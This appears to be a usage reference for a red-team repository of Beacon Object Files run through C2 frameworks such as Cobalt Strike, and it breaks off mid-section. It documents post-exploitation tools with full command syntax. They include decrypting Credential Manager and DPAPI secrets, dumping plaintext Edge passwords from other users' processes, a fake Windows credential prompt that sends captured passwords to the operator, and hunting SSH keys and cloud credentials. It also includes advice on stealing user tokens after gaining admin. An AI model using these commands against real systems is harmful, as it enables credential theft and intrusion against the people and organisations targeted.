# BOF Usage Reference

This document provides usage information for all BOFs in the repository. Each section includes the command syntax, arguments, and examples based on the OC2 integration scripts.

---

## Table of Contents

### This Repository
- [adduser-domaingroup](#adduser-domaingroup)
- [adduser-localgroup](#adduser-localgroup)
- [bkread](#bkread)
- [credguard-check](#credguard-check)
- [checkaccess](#checkaccess)
- [curl](#curl)
- [decrypt-credmanager](#decrypt-credmanager)
- [dpapi-unprotect](#dpapi-unprotect)
- [dsreg-status](#dsreg-status)
- [edge-passdump](#edge-passdump)
- [enum-credmanager](#enum-credmanager)
- [enum-creds](#enum-creds)
- [enum-logon-events](#enum-logon-events)
- [enum-registry](#enum-registry)
- [enum-stored-accounts](#enum-stored-accounts)
- [enum-user-right](#enum-user-right)
- [fake-windows-popup](#fake-windows-popup)
- [enumshares](#enumshares)
- [enumshares-file](#enumshares-file)
- [listpipes](#listpipes)
- [lsfiles](#lsfiles)
- [nslookup-file](#nslookup-file)
- [portscan](#portscan)
- [portscan-file](#portscan-file)
- [removeuser-domaingroup](#removeuser-domaingroup)
- [removeuser-localgroup](#removeuser-localgroup)
- [sccm-wmi](#sccm-wmi)
- [sccm-disk](#sccm-disk)
- [sccm-local-recon](#sccm-local-recon)

### External BOF Scripts
- [adduser](#adduser) (CS-Remote-OPs-BOF)
- [cookie-monster](#cookie-monster)
- [Kerbeus-BOF](#kerbeus-bof-kerberos-operations) (Kerberos operations)
- [LNKgenerator-BOF](#lnkgenerator-bof) (shortcut/.lnk file creation)
- [OperatorsKit](#operatorskit) (addtaskscheduler, credprompt)
- [PrivKit](#privkit) (privilege escalation checks)
- [SQL-BOF](#sql-bof-sql-server-operations) (SQL Server operations)

---

## adduser-domaingroup

Add a domain user to a domain **global or universal** group via `NetGroupAddUser`. The target must be a domain controller for the user's domain. For domain-local groups, use `adduser-localgroup --computer \\<dc>` instead.

### Syntax
```
adduser-domaingroup <groupname> <username> [--computer <computername>]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `groupname` | Yes | Domain group name (e.g., 'GG-Sysadmins') |
| `username` | Yes | User to add (SAM account name, e.g., 'alice'). `DOMAIN\user` and `user@domain` forms are auto-stripped by the OC2 wrapper. |
| `--computer` | No | DC name/FQDN (e.g., `\\dc01.corp.local`). Omit only when running on the DC itself. |

### Examples
```bash
# Add user to a global group on the DC
adduser-domaingroup 'GG-Sysadmins' alice --computer \\dc01.corp.local

# DOMAIN\ prefix is auto-stripped
adduser-domaingroup 'GG-Sysadmins' CORP\alice --computer \\dc01.corp.local

# UPN suffix is auto-stripped
adduser-domaingroup 'GG-Sysadmins' alice@corp.local --computer \\dc01.corp.local
```

---

## adduser-localgroup

Add a user (local or domain) to a local group on a Windows computer.

### Syntax
```
adduser-localgroup <groupname> <username> [--computer <computername>]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `groupname` | Yes | Local group name (e.g., 'Administrators', 'Remote Desktop Users') |
| `username` | Yes | User to add - can be local (e.g., 'john') or domain (e.g., 'DOMAIN\john') |
| `--computer` | No | Target computer name (default: local computer) |

### Examples
```bash
# Add local user to Administrators group
adduser-localgroup Administrators john

# Add domain user to local group
adduser-localgroup Administrators DOMAIN\john

# Add user on remote computer
adduser-localgroup 'Remote Desktop Users' john --computer \\COMPUTER01

# Add domain user to remote computer's local group
adduser-localgroup Administrators CORP\alice --computer \\SERVER01
```

---

## bkread

Read a file by enabling `SeBackupPrivilege` and opening it with `FILE_FLAG_BACKUP_SEMANTICS`.

### Syntax
```
bkread <path> [--max-bytes|-m <bytes>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `path` | Yes | - | Target file path to read |
| `--max-bytes`, `-m` | No | 1048576 | Maximum bytes to stream (1 MB default, 16 MB hard limit) |

### Output
- Prints file metadata, then streams file content to beacon output
- Does not change file ownership or DACLs
- Fails on directory targets in the current implementation
- If the file has the EFS attribute set, the BOF calls that out in the metadata line

### Examples
```bash
# Read a private SSH key that denies normal SYSTEM reads
bkread C:\Users\alice\.ssh\id_ed25519

# Limit output to 8 KB
bkread C:\Users\alice\.ssh\id_rsa --max-bytes 8192

# Read another protected file by known path
bkread "C:\Users\alice\AppData\Roaming\Microsoft\Credentials\file" -m 65536
```

---

## credguard-check

Check Windows security features status (Credential Guard, HVCI, LSA Protection, VBS).

### Syntax
```
credguard-check
```

### Arguments
None.

### Security Features Checked
| Feature | Registry Key | Values |
|---------|--------------|--------|
| Credential Guard | Lsa\LsaCfgFlags | 1=UEFI lock, 2=no UEFI lock, 0=disabled |
| HVCI | DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity\Enabled | 1=enabled |
| LSA Protection | Lsa\RunAsPPL | 1=enabled with UEFI, 2=enabled without UEFI |
| VBS | DeviceGuard\EnableVirtualizationBasedSecurity | 1=enabled |

### Output
- `[+]` indicates the feature is ENABLED
- `[-]` indicates the feature is DISABLED or NOT CONFIGURED

### Examples
```bash
credguard-check
```

---

## checkaccess

Probe read access for a directory path (UNC or local) and its subdirectories.

### Syntax
```
checkaccess [--recursive|-r] [--suppress-access-denied|--suppress-denied|-s] <path>
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `path` | Yes | - | Directory path to probe (UNC or local) |
| `--recursive`, `-r` | No | Disabled | Recursively probe all nested subdirectories (default is depth 1 only) |
| `--suppress-access-denied`, `--suppress-denied`, `-s` | No | Disabled | Suppress subdirectory lines with `[-] Access denied` |

### Output
- First line always reports the parent path verdict
- If the parent path is accessible, the command prints verdicts for child directories (depth 1 by default, all levels with `-r`)
- `--suppress-access-denied` only filters subdirectory `[-] Access denied` lines
- `[+] Accessible` - Directory listing probe succeeded
- `[-] Access denied` - No read/list access
- `[!] No file system access` - IPC$ share path
- `[-] Not a directory` - Path exists but is not a directory

### Examples
```bash
# UNC directory
checkaccess \\test\dept

# UNC directory + depth-1 subdirectory checks
checkaccess \\dc01.corp.local\sysvol

# Full recursive subdirectory checks
checkaccess \\dc01.corp.local\sysvol -r

# Suppress subdirectory access denied lines
checkaccess \\dc01.corp.local\sysvol --suppress-access-denied

# Recursive and suppress access denied lines
checkaccess \\dc01.corp.local\sysvol -r --suppress-access-denied

# Nested UNC directory
checkaccess \\fileserver\projects\retail

# Local directory
checkaccess C:\Users\Public
```

---

## curl

Retrieve TLS certificate, response headers, and page content from a URL.

### Syntax
```
curl <command> <url> [--ua <user-agent>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `command` | Yes | - | Command: `finger` or `print` |
| `url` | Yes | - | URL to request |
| `--ua` | No | Edge browser UA | Custom User-Agent string |

### Commands
- `finger`: Retrieve headers, TLS certificate, and page title
- `print`: Fetch and print the raw page content

### Examples
```bash
# Retrieve headers, TLS certificate, and page title
curl finger https://example.com

# Fetch and print the raw page content
curl print https://example.com

# Use a custom User-Agent
curl finger https://example.com --ua "Custom User Agent"
```

---

## decrypt-credmanager

Enumerate and DECRYPT credentials stored in Windows Credential Manager. Uses DPAPI (CryptUnprotectData) to extract passwords.

### Syntax
```
decrypt-credmanager [--filter <string>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--filter`, `-f` | No | (all) | Filter string for credential target names |

### Credential Types
- GENERIC: Generic credentials (cmdkey /generic)
- DOMAIN_PASSWORD: Domain passwords (RDP, network shares)
- DOMAIN_CERTIFICATE: Certificate-based domain credentials
- DOMAIN_VISIBLE_PASSWORD: Domain passwords with visible UI
- GENERIC_CERTIFICATE: Generic certificate credentials

### Notes
- Runs in current user context (no admin required)
- Only decrypts credentials encrypted by the current user
- Displays passwords in plaintext in beacon output

### Admin workflow for other users

Admin rights alone do not decrypt another user's vault, because DPAPI ties each blob to the owning user's logon secret. Run `enum-stored-accounts` to see which profiles hold Credential Manager blobs. Then steal or create a token for that user and run `decrypt-credmanager` under that token. The user must be logged on, or you need their password or NT hash to make the token.

### Examples
```bash
# Decrypt all credentials
decrypt-credmanager

# Filter by target name
decrypt-credmanager -f github.com

# Filter for domain credentials
decrypt-credmanager --filter domain
```

---

## dpapi-unprotect

Decrypt an arbitrary DPAPI blob with `CryptUnprotectData()` in the current user's context, with optional entropy. Useful for blobs you've recovered from disk, memory, or a process dump where extracting master keys yourself isn't worth the effort.

### Syntax
```
dpapi-unprotect <blob_hex> [--entropy <hex>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `blob` | Yes | — | DPAPI blob as a hex string. Must start with the version DWORD `01000000` followed by the provider GUID `d08c9ddf-0115-d111-8c7a-00c04fc297eb`. |
| `--entropy`, `-e` | No | (none) | Optional entropy as a hex string. Required if the application protected the blob with a custom entropy parameter (e.g. SCD/Dimension prepends 16 bytes to the stored blob). |

### Notes
- Runs in current user context (no admin required); the calling user must be the one who originally protected the blob.
- From SYSTEM, impersonate the target user's token first — DPAPI is per-user.
- Output is printed as hex, ASCII, and UTF-16LE so the operator can pick the right interpretation.
- Common errors: `0x8007000d` (`ERROR_INVALID_DATA`) usually means wrong/missing entropy; `0x80090005` (`NTE_BAD_DATA`) usually means wrong user context.

### Examples
```bash
# Standard DPAPI blob, no entropy
dpapi-unprotect 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000...

# Blob protected with application-specific entropy
dpapi-unprotect 01000000d08c9ddf... -e 5f7531c034393c60adb7440063f2ee46
```

---

## dsreg-status

Report the documented portions of `dsregcmd /status` from user context without
shelling out to `dsregcmd.exe`.

### Syntax
```text
dsreg-status
```

### Arguments
None.

### Output
- `Device State`: Azure AD, workplace, and domain join state
- `Device Details`: device ID plus join certificate thumbprint and validity
- `Tenant Details`: tenant ID, display name, IdP domain, join-user email, MDM URLs
- `User State`: user email and user key metadata when exposed by `DSREG_USER_INFO`
- `Work Account 1`: work account and enrollment URLs
- `IE Proxy Config for Current User`
- `WinHttp Default Proxy Config`

### Phase 1 Limitations
- `SSO State`, `Diagnostic Data`, and `Ngc Prerequisite Check` are printed as `UNAVAILABLE (phase 2)`
- `DeviceAuthStatus`, key provider/container, and TPM-backed key reporting are not implemented in Phase 1
- Designed for user-context execution on Entra joined, hybrid joined, and workplace-joined devices

### Examples
```bash
dsreg-status
```

---

## edge-passdump

Dump plaintext credentials saved in Microsoft Edge by scanning `msedge.exe`
process memory. Targets the built-in Microsoft Password Manager / Autofill
feature, which keeps stored passwords in cleartext in the parent (root) browser
process. Microsoft has stated this is "by design".

On a terminal server an administrator with `SeDebugPrivilege` can harvest
stored credentials for every interactive user from a single beacon.

### Syntax
```
edge-passdump [--pid <int>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--pid`, `-p` | No | `0` (all) | Scan only this PID. Must be a `msedge.exe` root process. `0` enumerates all root processes. |

### Output
- One `[*] Scanning PID <pid> (<DOMAIN\user>)` line per process
- One `    <user> : <pass> @ <url>` line per unique credential found
- Final summary: processes scanned, total matches, unique matches

### Examples
```bash
# Enumerate and scan all root msedge.exe processes
edge-passdump

# Target a specific PID
edge-passdump --pid 4321
```

### Notes
- Requires Administrator / `SeDebugPrivilege` to read other users' processes
- Works against Edge 147.0.3912.98 and earlier; newer builds may scrub the buffer
- Only the parent `msedge.exe` (parent PID is not also `msedge.exe`) holds the credentials
- Renderer / GPU child processes are skipped automatically
- Passwords containing spaces are not matched (avoids regex backtracking)
- Username/password length bounds: 3-20 / 6-40 bytes
- Read-only operations - no remote process is modified
- Reference: <https://github.com/skesik/EdgeSavedPasswordsDumper>

---

## enum-user-right

List the accounts assigned a selected user right in the target computer's
current Local Security Authority (LSA) policy. It uses LSA RPC for remote
targets; it does not crawl SYSVOL or identify the GPO that produced the policy.

### Syntax
```
enum-user-right [--computer <computer>] [--right <SeRightName>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--computer` | No | local computer | Target computer or DC. A name such as `dc01.corp.local` or `\\dc01.corp.local` is accepted. |
| `--right` | No | `SeMachineAccountPrivilege` | The Windows user-right constant to query, such as `SeRemoteInteractiveLogonRight`. |

### Examples
```bash
# Find who can add workstations to the domain under the effective policy on this DC
enum-user-right --computer dc01.corp.local

# Query the local effective assignment for Remote Desktop logon
enum-user-right --right SeRemoteInteractiveLogonRight

# Query a different host using an explicit UNC-style computer name
enum-user-right --computer \\server01 --right SeServiceLogonRight
```

### Notes
- `SeMachineAccountPrivilege` is the **Add workstations to domain** user right. This is distinct from `ms-DS-MachineAccountQuota`: the latter is the default AD quota path, not an explicit LSA right assignment.
- Results represent the policy currently effective on the queried computer. They do not establish which GPO, local policy, or other configuration source created the assignment.
- Remote calls require a reachable LSA RPC endpoint and sufficient policy-query access; in most practical environments that means administrator-equivalent rights on the target.
- Name resolution is attempted on the target policy. Deleted or otherwise unmapped principals are printed as raw SIDs.

---

## fake-windows-popup

Display the native Windows credential dialog over a dimmed interactive desktop.
This x64 BOF-PE defaults to one capture-only submission and suppresses password
output. Validation, password output, and persistence require explicit flags.

### Packed interface

```text
ZZiiiii: caption message timeout-seconds max-attempts validate include-password persistent
```

| Argument | Default | Description |
|----------|---------|-------------|
| `caption` | `Windows Security` | UTF-16 dialog caption; pass an empty string for the default. |
| `message` | Generated from the DC or hostname | UTF-16 dialog message; pass an empty string for the default. |
| `timeout-seconds` | `60` | Overall timeout, clamped to 10–300 seconds. |
| `max-attempts` | `1` | Submission limit, clamped to 1–3. |
| `validate` | `0` | Set to `1` to call `LogonUserW`; this creates authentication traffic and may contribute to lockout. |
| `include-password` | `0` | Set to `1` to send the final submitted password through the C2 output channel, whether validation succeeds or fails. |
| `persistent` | `0` | Set to `1` to reopen ordinary Cancel/close and empty-password submissions until timeout. `Ctrl+Alt+0` remains an emergency exit. |

### Standalone example

Place the SDK-built `beacon.dll` beside the executable:

```text
fake-windows-popup.exe "" "" 60 1 0 0 0
```

### Cobalt Strike built-in example

The built-in `inline-execute-pe` command sends one raw string rather than a
Beacon-packed buffer. Use the numeric shorthand for default caption/message:

```text
inline-execute-pe /path/fake-windows-popup.exe 60 1 0 0 1
```

The raw full form is also accepted:

```text
inline-execute-pe /path/fake-windows-popup.exe "Windows Security" "Enter your credentials" 60 1 0 0 1
```

For backward compatibility, the trailing `persistent` value may be omitted.
Loaders and wrappers that use `bof_pack` should continue to use `ZZiiiii`.

### Emergency exit

Press `Ctrl+Alt+0` on the main keyboard row to close the credential prompt and
desktop dimmer. The hotkey remains active in persistent mode. If Windows delays
closing its credential UI, the invocation waits instead of terminating a thread
inside Beacon.

### Notes

- This is a linked BOF-PE, not a COFF `.o` file. It requires a compatible BOF-PE loader.
- No OC2 wrapper is included because this repository does not yet contain or document an OC2 BOF-PE loader.
- The prompt appears only on the process's current interactive desktop.
- Startup output reports `session` and `console-session` for diagnosis. They can
  legitimately differ when the interactive desktop is an RDP session.
- A background Beacon may be denied foreground activation. In that case the
  dimmer automatically leaves the topmost band so it cannot hide brokered CredUI.
- The overlay imitates secure-desktop dimming; it cannot run on the secure desktop.
- Persistent mode does not consume `max-attempts` for Cancel/close or empty-password submissions; only nonempty validation submissions count.
- With multiple validation attempts, the BOF wipes each failed submission before
  reopening the prompt. It retains only the final failed submission for output,
  and prints its password only when `include-password=1`.

---

## enum-credmanager

Enumerate credentials stored in Windows Credential Manager (metadata only, no decryption).

### Syntax
```
enum-credmanager [--filter <string>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--filter`, `-f` | No | (all) | Filter string for credential target names |

### Output
- Credential target name
- Username
- Credential type
- Persistence type (SESSION, LOCAL_MACHINE, ENTERPRISE)

### Notes
- Lists the current user's vault only. Run `enum-stored-accounts` to find which other profiles hold Credential Manager blobs. Then steal a token for that user and run this command or `decrypt-credmanager` again.

### Examples
```bash
# List all credentials
enum-credmanager

# Filter by target name
enum-credmanager -f github.com

# Filter for domain credentials
enum-credmanager --filter domain
```

---

## enum-creds

Unified file enumeration for credential and application data discovery. Replaces `enum-appdata`, `enum-browser-creds`, `enum-credfiles`, and `enum-consolehistory`.

Traversal notes:
- Default execution focuses on browser credential stores, credential files, and PowerShell history
- Add `--appdata` or `--all` to include the noisier application-data artifact set
- Browser credential stores and PSReadLine history use targeted per-user path checks under `C:\Users`
- Recursive search remains in place for app-data and credential-file discovery
- Skips reparse points and system directories during recursion
- At `C:\Users` root, skips default or unsafe profile entries such as `Public`, `Default`, and junction-style directories

Content dump notes:
- `--dump` prints the contents of each matched file directly under its metadata line, so one task returns both the file list and the text
- Each file is capped by `--dump-max-bytes` (default 65536, hard limit 1048576); a truncated dump says so in its `BEGIN` line
- Files whose first chunk contains a NUL byte are reported as binary and skipped (SQLite stores, `key4.db`, `.kdbx`, `TokenCache.dat`)
- UTF-16LE files with a BOM are converted to UTF-8 before printing

### Syntax
```
enum-creds [path] [--appdata] [--browser] [--creds] [--history] [--all] [--dump [--dump-max-bytes <n>]] [sub-type flags...]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `path` | No | C:\Users | Directory to search |
| `--appdata` | No | - | Search for app data (DB clients, chat apps, browser extensions) |
| `--browser` | No | - | Search for browser credential files (Firefox, Chrome, Edge) |
| `--creds` | No | - | Search for credential files (SSH, cloud, git, passwords, VPN) |
| `--history` | No | - | Search for PowerShell console history files (PSReadLine) |
| `--all` | No | - | Search for all file types, including app-data artifacts |
| `--dump` | No | - | Print the contents of each matched text file inline |
| `--dump-max-bytes` | No | 65536 | Max bytes printed per file with `--dump` (1 to 1048576) |

### Sub-type Flags (Creds)
| Flag | Description |
|------|-------------|
| `--ssh` | SSH private keys (id_rsa, id_ed25519, .ppk) |
| `--cloud` | Cloud credentials (AWS, Azure, GCP, Kubernetes) |
| `--git` | Git credentials and configs |
| `--passwords` | Password manager databases (KeePass, 1Password) |
| `--vpn` | VPN configuration files |
| `--setup` | Unattend/sysprep answer files under the Windows directory and drive root |

### Sub-type Flags (Appdata)
| Flag | Description |
|------|-------------|
| `--db-clients` | Database client files (SSMS, MySQL, DBeaver, pgAdmin, DataGrip) |
| `--chat-apps` | Chat application tokens (Slack, Teams, Discord) |
| `--browser-extensions` | Browser extension files (Chrome, Edge, Firefox) |

Using a sub-type flag implicitly enables its parent group.

### Targets

**App Data (--appdata):**
- SSMS: SqlStudio.bin, MySQL Workbench: connections.xml
- DBeaver: credentials-config.json, data-sources.json
- pgAdmin: pgpass, DataGrip: database.xml
- Slack/Teams/Discord: Cookies, LevelDB files
- Chrome/Edge/Firefox: extension manifest files

**Browser Creds (--browser):**
- Firefox: logins.json, key4.db
- Chrome: Local State, Cookies, Login Data
- Edge: Local State, Cookies, Login Data

**Credential Files (--creds):**
- SSH: id_rsa, id_ed25519, id_ecdsa, id_dsa, *.ppk
- AWS: .aws/credentials, .aws/config
- Azure: TokenCache.dat, AzureRmContext.json
- GCP: application_default_credentials.json, .kube/config
- Git: .git-credentials, .gitconfig, .git/config
- KeePass: *.kdbx, 1Password: *.opvault, *.agilekeychain
- VPN: *.ovpn, wg*.conf, *.pcf, vpn_config.xml
- Setup: Unattend.xml, Unattended.xml under `%WINDIR%\Panther` and `%WINDIR%\System32\Sysprep`, sysprep.xml, sysprep.inf, and `unattend.xml` at the drive root

**Console History (--history):**
- PSReadLine: ConsoleHost_history.txt
- Transcripts: PowerShell_transcript*.txt in each user's Documents folder
- Transcription policy: reads `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription` and lists PowerShell_transcript*.txt in the configured OutputDirectory and its per-day subfolders (capped at 200 files)

Setup answer files and the transcription policy are fixed system locations. They are probed whenever their group is active, regardless of the `path` argument.

### Examples
```bash
# Search C:\Users using the default credential-focused set
enum-creds

# Search specific user directory
enum-creds C:\Users\bob

# Browser credential files only
enum-creds --browser

# SSH keys and cloud credentials only
enum-creds --creds --ssh --cloud

# Database client files only
enum-creds --appdata --db-clients

# Credential files + browser creds
enum-creds --creds --browser

# PowerShell console history only
enum-creds --history

# Print every user's PowerShell history inline
enum-creds --history --dump

# Print git and cloud credential files inline, 16 KB per file
enum-creds --git --cloud --dump --dump-max-bytes 16384

# Search entire C: drive (warning: slow)
enum-creds C:\ --all

# Password manager databases only
enum-creds --passwords
```

---

## enum-logon-events

Enumerate Windows Security Event Log Event ID 4624 (successful logon events). Requires administrator privileges.

### Syntax
```
enum-logon-events [--days <n>] [--max-events <n>] [--logon-type <type>]
```

### Arguments
| Argument | Required | Default | Range | Description |
|----------|----------|---------|-------|-------------|
| `--days`, `-d` | No | 7 | 1-30 | Number of days to query |
| `--max-events`, `-m` | No | 500 | 10-5000 | Maximum number of events to display |
| `--logon-type`, `-t` | No | all | 2-13 or alias | Only show one logon type. Aliases: `interactive` (2), `network` (3), `batch` (4), `service` (5), `unlock` (7), `cleartext` (8), `runas` (9), `rdp` (10), `cached` (11), `cachedremote` (12), `cachedunlock` (13) |

The logon type is placed in the XPath query, so the event log service filters server-side and the beacon only renders matching events. `--max-events` caps displayed events. The BOF also stops after scanning 20000 events in total, so narrow the window with `--days` or `--logon-type` on busy servers.

### Event Information
- Timestamp (local time)
- Logon type (Interactive, Network, RemoteInteractive, etc.)
- Target user (who logged in)
- Source IP address (for network/remote logons)
- Authentication method (NTLM v1, NTLM v2, Kerberos)

### Logon Types
| Type | Number | Description |
|------|--------|-------------|
| Interactive | 2 | Local keyboard/console logon |
| Network | 3 | SMB, network share access |
| Batch | 4 | Scheduled task |
| Service | 5 | Windows service startup |
| Unlock | 7 | Workstation unlock |
| NetworkCleartext | 8 | Network logon with cleartext password (IIS basic auth) |
| NewCredentials | 9 | `runas /netonly` |
| RemoteInteractive | 10 | RDP logon |
| CachedInteractive | 11 | Offline domain logon with cached credentials |
| CachedRemoteInteractive | 12 | RDP with cached credentials |
| CachedUnlock | 13 | Unlock with cached credentials |

### Filtered Accounts (not displayed)
- SYSTEM, LOCAL SERVICE, NETWORK SERVICE
- Computer accounts (ending with $)
- ANONYMOUS LOGON
- UMFD-X, DWM-X accounts

### Examples
```bash
# Last 7 days, max 500 events
enum-logon-events

# Last 24 hours
enum-logon-events --days 1

# Last 30 days, up to 1000 events
enum-logon-events --days 30 --max-events 1000

# RDP logons only (type 10)
enum-logon-events --logon-type rdp

# Network logons in the last 24 hours
enum-logon-events -t 3 -d 1

# Last 3 days, max 200 events
enum-logon-events -d 3 -m 200
```

---

## enum-registry

Gather intelligence from Windows Registry including RDP history, installed software, environment variables, and WSL/Docker detection.

Per-user data (RDP history, user environment, WSL) is read from every loaded hive under `HKEY_USERS`, with each SID resolved to `DOMAIN\user`. With admin rights this covers all logged-on users. Without admin, other users' hives are reported as access denied. Only users with an active session have a loaded hive. Offline profiles are not visible this way. If `HKEY_USERS` cannot be enumerated at all, the BOF falls back to `HKEY_CURRENT_USER`.

### Syntax
```
enum-registry [--rdp] [--software] [--env] [--wsl] [--all]
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `--rdp` | No | Enumerate RDP connection history |
| `--software` | No | Enumerate installed software |
| `--env` | No | Enumerate environment variables |
| `--wsl` | No | Detect WSL and Docker installations |
| `--all` | No | Gather all registry intelligence (default if no filters) |

### Intel Types
**RDP History:**
- Terminal Server Client\Servers registry keys, one section per loaded user hive
- Default MRU list (Most Recently Used)

**Software:**
- HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
- Includes both 64-bit and 32-bit applications

**Environment Variables:**
- System environment variables (HKLM)
- User environment variables for every loaded hive (HKEY_USERS\<SID>\Environment)

**WSL/Docker:**
- Windows Subsystem for Linux installations, per loaded user hive
- WSL distributions
- Docker Desktop installation

### Examples
```bash
# Gather all registry intelligence
enum-registry

# RDP connection history only
enum-registry --rdp

# Installed software only
enum-registry --software

# RDP history and software
enum-registry --rdp --software

# Environment variables only
enum-registry --env

# WSL/Docker detection only
enum-registry --wsl
```

---

## enum-stored-accounts

Inventory of which accounts have credentials stored on the host and where. Run it right after gaining admin, before touching LSASS or DPAPI. The output tells you which LSA secrets, task credentials and user tokens are worth going after. Read-only.

### Syntax
```
enum-stored-accounts [--services] [--tasks] [--dpapi] [--all] [--users-root <path>]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--services` | No | - | Services whose `ObjectName` is a real account (not LocalSystem, NT AUTHORITY or NT SERVICE) |
| `--tasks` | No | - | Scheduled tasks whose XML has `LogonType` `Password` or `InteractiveTokenOrPassword` |
| `--dpapi` | No | - | Per-profile Credential Manager blobs, DPAPI masterkeys (SID resolved to account) and vault entries |
| `--all` | No | - | All sections (the default with no section flag) |
| `--users-root` | No | `<system drive>\Users` | Profiles directory for `--dpapi` |

### What each section means

**Services:** the account's password is stored in LSA secrets as `_SC_<ServiceName>`. Accounts ending in `$` (gMSA or computer accounts) are flagged because they have no password there. Output shows service key name, account, start type, display name and image path.

**Tasks:** at registration time the task scheduler stored the account's password. It is recoverable from the SYSTEM Credential Manager via DPAPI. Output shows task path, `UserId`, `LogonType`, `RunLevel` and whether the task is disabled. Reading the Tasks folder requires admin.

**DPAPI:** for each profile under the users root, counts three things. Credential Manager blobs under `AppData\Roaming\Microsoft\Credentials` and `AppData\Local\Microsoft\Credentials`. Masterkeys under `AppData\Roaming\Microsoft\Protect\<SID>`. Vault entries (`.vcrd`) under `AppData\Local\Microsoft\Vault`. The SID is resolved to `DOMAIN\user`. The output states whether that user's hive is loaded under `HKEY_USERS`. A loaded hive means the user is logged on and a token can be stolen. Otherwise you need the user's password or NT hash, or the domain DPAPI backup key.

### Limits
- Task scan stops after 3000 files or depth 8
- Profile scan stops after 256 profiles
- Without admin, only the current user's profile and tasks are readable

### Examples
```bash
# All sections
enum-stored-accounts

# Service accounts only
enum-stored-accounts --services

# Tasks with stored passwords only
enum-stored-accounts --tasks

# DPAPI material from a non-default profiles directory
enum-stored-accounts --dpapi --users-root D:\Profiles
```

---

## enumshares

Enumerate remote shares and test filesystem access on a single host.

### Syntax
```
enumshares <host>
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
| `host` | Yes | Hostname or IP to enumerate shares on |

### Output
| Indicator | Meaning |
|-----------|---------|
| `[+] Accessible` | Share contents can be listed (confirmed read access) |
| `[-] Access denied` | No filesystem access to the share |
| `[!] No file system access` | IPC$ share (skipped) |

### Examples
```bash
enumshares DC01
enumshares 10.100.10.1
enumshares fileserver.example.local
```

### CNA (Cobalt Strike)
The CNA script auto-detects mode: if the argument is an existing file path, it reads hostnames from the file; otherwise it treats it as a single hostname.
```bash
enumshares DC01
enumshares C:\Users\RTO\Documents\hostnames.txt
```

---

## enumshares-file

Enumerate remote shares and test filesystem access across multiple hosts from an uploaded hostnames file (OC2 only).

### Syntax
```
enumshares-file
```
Upload a newline-separated hostnames file via the OC2 GUI file dialog.

### Hostnames File Format
One hostname per line:
```
database
database.example.local
10.100.10.1
```

### Output
Same as [enumshares](#enumshares).

### Examples
```bash
# OC2: run command, then upload hostnames file via GUI
enumshares-file
```

---

## listpipes

List local named pipes via NtQueryDirectoryFile.

### Syntax
```
listpipes
```

### Arguments
None.

### Output
One pipe per line with full path (e.g., `\\.\pipe\pipename`)

### Examples
```bash
listpipes
```

---

## lsfiles

Enumerate files in a directory with wildcard pattern support. Lists only the target directory by default; use `-r` to recurse. Use `--include-dirs` to also print matching directories.

### Syntax
```
lsfiles <path> [-r] [--pattern <pattern>] [--exclude <pattern>] [--exclude-path <path-pattern>] [--max-depth <n>] [--max-results <n>] [--include-dirs|--dirs] [--date-filter <date>] [--min-size <bytes>] [--max-size <bytes>] [--suppress-errors]
```

### Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `path` | Yes | - | Target directory (supports wildcards) |
| `--recursive`, `-r` | No | off | Recurse into subdirectories |
| `--pattern`, `-p` | No | * | Wildcard pattern to filter files |
| `--exclude`, `-e` | No | - | Exclude pattern (can be used multiple times) |
| `--exclude-path` | No | - | Exclude full paths and prune matching directory subtrees |
| `--max-depth`, `-d` | No | 0 | Maximum recursion depth (-1 = unlimited). Implies `-r`. |
| `--max-results`, `-mr` | No | 1000 | Maximum results to return (-1 = unlimited) |
| `--include-dirs`, `--dirs` | No | off | Include directory entries in output |
| `--date-filter`, `-df` | No | - | Filter by date: YYYY, YYYY-MM, or YYYY-MM-DD |
| `--min-size`, `-mins` | No | -1 | Minimum file size in bytes |
| `--max-size`, `-maxs` | No | -1 | Maximum file size in bytes |
| `--suppress-errors`, `-s` | No | - | Suppress access denied errors |

### Wildcard Support
**Path wildcards:**
- `*` matches any directory name (e.g., `C:\Users\*`)
- `?` matches any single character

**Filename wildcards:**
- `*` matches any sequence of characters
- `?` matches any single character

### Examples
```bash
# List only the target directory (no recursion)
lsfiles C:\Users\target\Desktop

# Recursive, unlimited depth
lsfiles C:\Users -r --pattern *.zip

# Recursive with depth limit (-d implies -r)
lsfiles "C:\Program Files" --pattern *.dll --max-depth 2

# Path wildcards
lsfiles C:\Users\* --pattern *.zip
lsfiles C:\Users\*\Downloads --pattern *.exe --date-filter 2025

# Other filters
lsfiles C:\Temp --pattern *.log --suppress-errors
lsfiles C:\Users --pattern *.zip --min-size 1048576
lsfiles C:\Temp --pattern *.log --max-size 1024
lsfiles C:\Repo -r --exclude-path *\.git\*
lsfiles C:\Users -r --exclude-path C:\Users\svc-build\AppData\Local\Temp\*

# Show directories too (useful for directory-only shares)
lsfiles \\test\dept --include-dirs
```

---

## nslookup-file

Resolve a file of hostnames to IPv4 addresses. Runs up to 64 DNS queries in parallel with `DnsQueryEx`. LLMNR and NetBIOS fallback are disabled. Requires Windows 8 / Server 2012 or later.

### Syntax
```
nslookup-file [dns server ip]                          # OC2, upload hostnames file via GUI
nslookup-file <path to hostnames file> [dns server ip] # CNA
```

### Arguments
| Argument | Required | Description |
|----------|----------|-------------|
